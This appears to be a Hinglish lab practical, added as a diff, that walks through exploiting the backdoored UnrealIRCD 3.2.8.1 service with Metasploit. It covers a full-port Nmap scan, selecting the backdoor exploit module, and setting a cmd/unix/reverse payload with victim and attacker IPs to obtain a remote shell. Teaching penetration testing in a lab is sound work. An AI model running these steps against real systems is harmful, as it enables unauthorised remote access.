@@ -1,0 +1,116 @@
+PRACTICAL NO. 7
+Using Metasploit Framework for Exploitation
+
+
+STEP-BY-STEP EXPLANATION
+🔹 Step 1: Initialize Metasploit Database
+sudo msfdb init
+
+🔍 Matlab:
+
+Metasploit ka database service start hota hai
+
+Scan results store karne ke liye DB ready hoti hai
+
+📌 Database = targets, services, vulnerabilities save kar sakte ho
+
+🔹 Step 2: Launch Metasploit Console
+sudo msfconsole
+
+🔍 Matlab:
+
+Metasploit Framework ka main interface open hota hai
+
+Yahin se exploits, payloads, scans run hote hain
+
+🔹 Step 3: Scan Target Using Nmap (via Metasploit)
+db_nmap -vv -sC -Pn -p- <IP address> --save
+
+🔍 Matlab:
+
+db_nmap → Nmap scan + results database me save
+
+-p- → all ports scan
+
+-sC → default NSE scripts
+
+-Pn → host discovery skip
+
+👉 Detailed scan + auto storage
+
+🔹 Step 4: View Discovered Services
+services
+
+🔍 Matlab:
+
+Target par chal rahi services list hoti hai
+
+Jaise: FTP, SSH, IRC, HTTP etc.
+
+📌 Yahin se vulnerable service identify hoti hai
+
+🔹 Step 5: Search Vulnerable Service (UnrealIRCD)
+search UnrealIRCD
+
+🔍 Matlab:
+
+UnrealIRCD service se related available exploits search karta hai
+
+🔹 Step 6: View Exploit Information
+info 0
+
+
+(0 = exploit ka index number)
+
+🔍 Matlab:
+
+Vulnerability description
+
+Affected versions
+
+Author
+
+References
+
+👉 Exploit samajhne ke liye use hota hai
+
+🔹 Step 7: Select Exploit Module
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+
+🔍 Matlab:
+
+UnrealIRCD 3.2.8.1 backdoor exploit select hota hai
+
+Ye known backdoored version hai
+
+🔹 Step 8: Set Target Parameters
+👉 Target IP:
+set RHOSTS 192.168.0.195
+
+👉 Payload type:
+set payload cmd/unix/reverse
+
+👉 Target service port:
+set RPORT 6697
+
+👉 Attacker IP (Kali Linux):
+set LHOST 192.168.0.156
+
+
+📌 RHOSTS = victim
+📌 LHOST = attacker
+
+🔹 Step 9: Execute Exploit
+exploit
+
+🔍 Matlab:
+
+Exploit target machine par run hota hai
+
+Agar successful:
+
+Remote shell milta hai
+
+Attacker ko access milta hai
+
+👉 Exploitation successful
